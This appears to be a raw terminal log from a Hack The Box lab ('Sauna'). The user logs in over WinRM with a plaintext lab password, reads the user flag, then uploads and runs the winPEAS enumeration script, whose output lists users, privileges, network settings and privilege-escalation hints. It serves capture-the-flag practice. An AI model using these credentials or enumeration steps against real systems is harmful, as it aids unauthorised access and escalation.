@@ -1,0 +1,933 @@
+user@kali:~/hackthebox/hackthebox/sauna$ evil-winrm -i 10.10.10.175 -u FSmith -p Thestrokes23
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents>
+Error: An error of type NoMethodError happened, message is undefined method `start_with?' for nil:NilClass
+
+Error: Exiting with code 1
+
+user@kali:~/hackthebox/hackthebox/sauna$ locate winpeas
+/home/user/hackthebox/hackthebox/devel/winpeas.out
+/home/user/tryhackme/hackpark/winpeas
+/home/user/tryhackme/hackpark/winpeas/tmux.log
+/home/user/tryhackme/hackpark/winpeas/winPEAS.bat
+/home/user/tryhackme/hackpark/winpeas/winPEAS.exe
+user@kali:~/hackthebox/hackthebox/sauna$ cp  /home/user/tryhackme/hackpark/winpeas/winPEAS.bat .
+user@kali:~/hackthebox/hackthebox/sauna$ ls
+gobuster  hash  impacket  kerbrute  nmap  sauna.ctb  sauna.ctb~  sauna.ctb~~  sauna.ctb~~~  sauna.md  screenshots  usernames  users  winPEAS.bat
+user@kali:~/hackthebox/hackthebox/sauna$ evil-winrm -i 10.10.10.175 -u FSmith -p Thestrokes23
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> dir
+*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
+c*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir
+
+
+    Directory: C:\Users\FSmith\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/23/2020  10:03 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
+1b5520b98d97cf17f24122a55baf70cf
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir
+
+
+    Directory: C:\Users\FSmith\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/23/2020  10:03 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> cd ..
+*Evil-WinRM* PS C:\Users\FSmith> cd Downloads
+*Evil-WinRM* PS C:\Users\FSmith\Downloads> dir
+*Evil-WinRM* PS C:\Users\FSmith\Downloads> upload winpeas.bat
+Info: Uploading winpeas.bat to C:\Users\FSmith\Downloads\winpeas.bat
+
+Error: Upload failed. Check filenames or paths
+
+*Evil-WinRM* PS C:\Users\FSmith\Downloads>
+*Evil-WinRM* PS C:\Users\FSmith\Downloads> upload winPEAS.bat
+Info: Uploading winPEAS.bat to C:\Users\FSmith\Downloads\winPEAS.bat
+
+
+Data: 43968 bytes of 43968 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\FSmith\Downloads> dir
+
+
+    Directory: C:\Users\FSmith\Downloads
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/15/2021  10:22 PM          32976 winPEAS.bat
+
+
+*Evil-WinRM* PS C:\Users\FSmith\Downloads> ./winPEAS.bat
+            *((,.,/((((((((((((((((((((/,  */
+     ,/*,..*(((((((((((((((((((((((((((((((((,
+   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
+   ((((((((((((((((* *****,,,/########## .(* ,((((((
+   (((((((((((/* ******************/####### .(. ((((((
+   ((((((..******************/@@@@@/***/######* /((((((
+   ,,..**********************@@@@@@@@@@(***,#### ../(((((
+   , ,**********************#@@@@@#@@@@*********##((/ /((((
+   ..(((##########*********/#@@@@@@@@@/*************,,..((((
+   .(((################(/******/@@@@@#****************.. /((
+   .((########################(/************************..*(
+   .((#############################(/********************.,(
+   .((##################################(/***************..(
+   .((######################################(************..(
+   .((######(,.***.,(###################(..***(/*********..(
+  .((######*(#####((##################((######/(********..(
+   .((##################(/**********(################(**...(
+   .(((####################/*******(###################.((((
+   .(((((############################################/  /((
+   ..(((((#########################################(..(((((.
+   ....(((((#####################################( .((((((.
+   ......(((((#################################( .(((((((.
+   (((((((((. ,(############################(../(((((((((.
+       (((((((((/,  ,####################(/..((((((((((.
+             (((((((((/,.  ,*//////*,. ./(((((((((((.
+                (((((((((((((((((((((((((((/"
+                       by carlospolop
+ECHO is off.
+Advisory: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author
+or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+ECHO is off.
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] BASIC SYSTEM INFO <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WINDOWS OS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check for vulnerabilities for the OS version with the applied patches
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
+winPEAS.bat : Access is denied.
+    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+ERROR:
+Description = Access denied
+
+
+
+Access is denied.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] DATE and TIME <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] You may need to adjust your local date/time to exploit some vulnerability
+Fri 01/15/2021
+10:22 PM
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Audit Settings <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check what is being logged
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WEF Settings <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check where are being sent the logs
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] LAPS installed? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check what is being logged
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] LSA protection? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Active if "1"
+
+
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Credential Guard? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Active if "1" or "2"
+
+
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WDigest? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Plain-text creds in memory if "1"
+ERROR: The system was unable to find the specified registry key or value.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Number of cached creds <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] You need System to extract them
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    CACHEDLOGONSCOUNT    REG_SZ    10
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] UAC Settings <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA    REG_DWORD    0x1
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Registered Anti-Virus(AV) <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+ERROR:
+Description = Invalid namespace
+
+
+
+Checking for defender whitelisted PATHS
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] PS settings <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+PowerShell v2 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
+    PowerShellVersion    REG_SZ    2.0
+
+PowerShell v5 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
+    PowerShellVersion    REG_SZ    5.1.17763.1
+
+Transcriptions Settings:
+ERROR: The system was unable to find the specified registry key or value.
+Module logging settings:
+ERROR: The system was unable to find the specified registry key or value.
+Scriptblog logging settings:
+ERROR: The system was unable to find the specified registry key or value.
+
+PS default transcript history
+The system cannot find the file specified.
+
+Checking PS history file
+The system cannot find the path specified.
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] MOUNTED DISKS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Maybe you find something interesting
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] ENVIRONMENT <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Interesting information?
+ALLUSERSPROFILE=C:\ProgramData
+APPDATA=C:\Users\FSmith\AppData\Roaming
+CommonProgramFiles=C:\Program Files\Common Files
+CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
+CommonProgramW6432=C:\Program Files\Common Files
+COMPUTERNAME=SAUNA
+ComSpec=C:\Windows\system32\cmd.exe
+DriverData=C:\Windows\System32\Drivers\DriverData
+expl=no
+LOCALAPPDATA=C:\Users\FSmith\AppData\Local
+long=no
+NUMBER_OF_PROCESSORS=2
+OS=Windows_NT
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\FSmith\AppData\Local\Microsoft\
+WindowsApps
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+PROCESSOR_ARCHITECTURE=AMD64
+PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
+PROCESSOR_LEVEL=23
+PROCESSOR_REVISION=0102
+ProgramData=C:\ProgramData
+ProgramFiles=C:\Program Files
+ProgramFiles(x86)=C:\Program Files (x86)
+ProgramW6432=C:\Program Files
+PROMPT=$P$G
+PSModulePath=C:\Users\FSmith\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PUBLIC=C:\Users\Public
+SystemDrive=C:
+SystemRoot=C:\Windows
+TEMP=C:\Users\FSmith\AppData\Local\Temp
+TMP=C:\Users\FSmith\AppData\Local\Temp
+USERDNSDOMAIN=EGOTISTICAL-BANK.LOCAL
+USERDOMAIN=EGOTISTICALBANK
+USERNAME=FSmith
+USERPROFILE=C:\Users\FSmith
+windir=C:\Windows
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] INSTALLED SOFTWARE <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Some weird software? Check for vulnerabilities in unknow software installed
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
+Common Files
+Common Files
+internet explorer
+Internet Explorer
+Microsoft.NET
+VMware
+Windows Defender
+Windows Defender
+Windows Defender Advanced Threat Protection
+Windows Mail
+Windows Mail
+Windows Media Player
+Windows Media Player
+Windows Multimedia Platform
+Windows Multimedia Platform
+windows nt
+windows nt
+Windows Photo Viewer
+Windows Photo Viewer
+Windows Portable Devices
+Windows Portable Devices
+Windows Security
+WindowsPowerShell
+WindowsPowerShell
+    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Remote Desktop Credentials Manager <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WSUS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] RUNNING PROCESSES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Something unexpected is running? Check for vulnerabilities
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
+ERROR: Access denied
+
+[i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
+ERROR:
+Description = Access denied
+
+[i] Checking directory permissions of running processes (DLL injection)
+ERROR:
+Description = Access denied
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] RUN AT STARTUP <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] AlwaysInstallElevated? <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] If '1' then you can install a .msi file with admin privileges ;)
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] NETWORK <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CURRENT SHARES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+System error 5 has occurred.
+
+Access is denied.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] INTERFACES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : SAUNA
+   Primary Dns Suffix  . . . . . . . : EGOTISTICAL-BANK.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : EGOTISTICAL-BANK.LOCAL
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
+   Physical Address. . . . . . . . . : 00-50-56-B9-48-14
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::18af:2305:848b:10a4(Preferred)
+   Link-local IPv6 Address . . . . . : fe80::18af:2305:848b:10a4%8(Preferred)
+   IPv4 Address. . . . . . . . . . . : 10.10.10.175(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:188e%8
+                                       10.10.10.2
+   DHCPv6 IAID . . . . . . . . . . . : 83906646
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-94-08-D1-00-50-56-B9-48-14
+   DNS Servers . . . . . . . . . . . : ::1
+                                       127.0.0.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] USED PORTS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check for services restricted from the outside
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       860
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       860
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       444
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1116
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1524
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       592
+  TCP    0.0.0.0:49676          0.0.0.0:0              LISTENING       2912
+  TCP    0.0.0.0:49679          0.0.0.0:0              LISTENING       584
+  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING       3068
+  TCP    0.0.0.0:60556          0.0.0.0:0              LISTENING       3032
+  TCP    10.10.10.175:53        0.0.0.0:0              LISTENING       3068
+  TCP    10.10.10.175:139       0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       3068
+  TCP    [::]:80                [::]:0                 LISTENING       4
+  TCP    [::]:88                [::]:0                 LISTENING       592
+  TCP    [::]:135               [::]:0                 LISTENING       860
+  TCP    [::]:389               [::]:0                 LISTENING       592
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:464               [::]:0                 LISTENING       592
+  TCP    [::]:593               [::]:0                 LISTENING       860
+  TCP    [::]:636               [::]:0                 LISTENING       592
+  TCP    [::]:3268              [::]:0                 LISTENING       592
+  TCP    [::]:3269              [::]:0                 LISTENING       592
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:9389              [::]:0                 LISTENING       2988
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49664             [::]:0                 LISTENING       444
+  TCP    [::]:49665             [::]:0                 LISTENING       1116
+  TCP    [::]:49666             [::]:0                 LISTENING       1524
+  TCP    [::]:49667             [::]:0                 LISTENING       592
+  TCP    [::]:49673             [::]:0                 LISTENING       592
+  TCP    [::]:49674             [::]:0                 LISTENING       592
+  TCP    [::]:49676             [::]:0                 LISTENING       2912
+  TCP    [::]:49679             [::]:0                 LISTENING       584
+  TCP    [::]:49686             [::]:0                 LISTENING       3068
+  TCP    [::]:60556             [::]:0                 LISTENING       3032
+  TCP    [::1]:53               [::]:0                 LISTENING       3068
+  TCP    [dead:beef::18af:2305:848b:10a4]:53  [::]:0                 LISTENING       3068
+  TCP    [fe80::18af:2305:848b:10a4%8]:53  [::]:0                 LISTENING       3068
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] FIREWALL <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Firewall status:
+-------------------------------------------------------------------
+Profile                           = Standard
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+Group policy version              = Windows Defender Firewall
+Remote admin mode                 = Disable
+
+Ports currently open on all network interfaces:
+Port   Protocol  Version  Program
+-------------------------------------------------------------------
+5985   TCP       Any      (null)
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated;
+use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands
+instead of "netsh firewall", see KB article 947709
+at https://go.microsoft.com/fwlink/?linkid=121488 .
+
+
+
+Domain profile configuration:
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+
+Service configuration for Domain profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          File and Printer Sharing
+
+Allowed programs configuration for Domain profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+
+Port configuration for Domain profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+5985   TCP       Enable  Inbound               Allow WinRM
+
+Standard profile configuration (current):
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+
+Service configuration for Standard profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          File and Printer Sharing
+Enable   Yes         Network Discovery
+
+Allowed programs configuration for Standard profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+
+Port configuration for Standard profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+5985   TCP       Enable  Inbound               Allow WinRM
+
+Log configuration:
+-------------------------------------------------------------------
+File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
+Max file size   = 4096 KB
+Dropped packets = Disable
+Connections     = Disable
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated;
+use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands
+instead of "netsh firewall", see KB article 947709
+at https://go.microsoft.com/fwlink/?linkid=121488 .
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] ARP <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Interface: 10.10.10.175 --- 0x8
+  Internet Address      Physical Address      Type
+  10.10.10.2            00-50-56-b9-18-8e     dynamic
+  10.10.10.255          ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] ROUTES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+===========================================================================
+Interface List
+  8...00 50 56 b9 48 14 ......Intel(R) 82574L Gigabit Network Connection
+  1...........................Software Loopback Interface 1
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0       10.10.10.2     10.10.10.175    281
+       10.10.10.0    255.255.255.0         On-link      10.10.10.175    281
+     10.10.10.175  255.255.255.255         On-link      10.10.10.175    281
+     10.10.10.255  255.255.255.255         On-link      10.10.10.175    281
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
+        224.0.0.0        240.0.0.0         On-link      10.10.10.175    281
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+  255.255.255.255  255.255.255.255         On-link      10.10.10.175    281
+===========================================================================
+Persistent Routes:
+  Network Address          Netmask  Gateway Address  Metric
+          0.0.0.0          0.0.0.0       10.10.10.2  Default
+===========================================================================
+
+IPv6 Route Table
+===========================================================================
+Active Routes:
+ If Metric Network Destination      Gateway
+  8    281 ::/0                     fe80::250:56ff:feb9:188e
+  1    331 ::1/128                  On-link
+  8    281 dead:beef::/64           On-link
+  8    281 dead:beef::18af:2305:848b:10a4/128
+                                    On-link
+  8    281 fe80::/64                On-link
+  8    281 fe80::18af:2305:848b:10a4/128
+                                    On-link
+  1    331 ff00::/8                 On-link
+  8    281 ff00::/8                 On-link
+===========================================================================
+Persistent Routes:
+  None
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Hosts file <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CACHE DNS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WIFI <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+The system cannot find the file specified.
+The following command was not found: wlan show profile.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_->[*] BASIC USER INFO <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivi
+lege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege
+  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CURRENT USER <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+User name                    FSmith
+Full Name                    Fergus Smith
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/23/2020 8:45:19 AM
+Password expires             Never
+Password changeable          1/24/2020 8:45:19 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/15/2021 8:44:09 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+User name                    FSmith
+Full Name                    Fergus Smith
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/23/2020 8:45:19 AM
+Password expires             Never
+Password changeable          1/24/2020 8:45:19 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/15/2021 8:44:09 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+
+USER INFORMATION
+----------------
+
+User Name              SID
+====================== ==============================================
+egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] USERS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The command completed with one or more errors.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] GROUPS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Aliases for \\SAUNA
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Account Operators
+*Administrators
+*Allowed RODC Password Replication Group
+*Backup Operators
+*Cert Publishers
+*Certificate Service DCOM Access
+*Cryptographic Operators
+*Denied RODC Password Replication Group
+*Distributed COM Users
+*DnsAdmins
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Incoming Forest Trust Builders
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Pre-Windows 2000 Compatible Access
+*Print Operators
+*RAS and IAS Servers
+*RDS Endpoint Servers
+*RDS Management Servers
+*RDS Remote Access Servers
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*Server Operators
+*Storage Replica Administrators
+*Terminal Server License Servers
+*Users
+*Windows Authorization Access Group
+The command completed successfully.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] ADMINISTRATORS GROUPS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+Domain Admins
+Enterprise Admins
+The command completed successfully.
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CURRENT LOGGED USERS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+No User exists for *
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Kerberos Tickets <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
+Current LogonId is 0:0x644317
+Error calling API LsaCallAuthenticationPackage (ShowTickets substatus): 1312
+
+klist failed with 0xc000005f/-1073741729: A specified logon session does not exist. It may already have been terminated.
+
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] CURRENT CLIPBOARD <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+[i] Any password inside the clipboard?
+
+
+
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] SERVICES VULNERABILITIES <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+
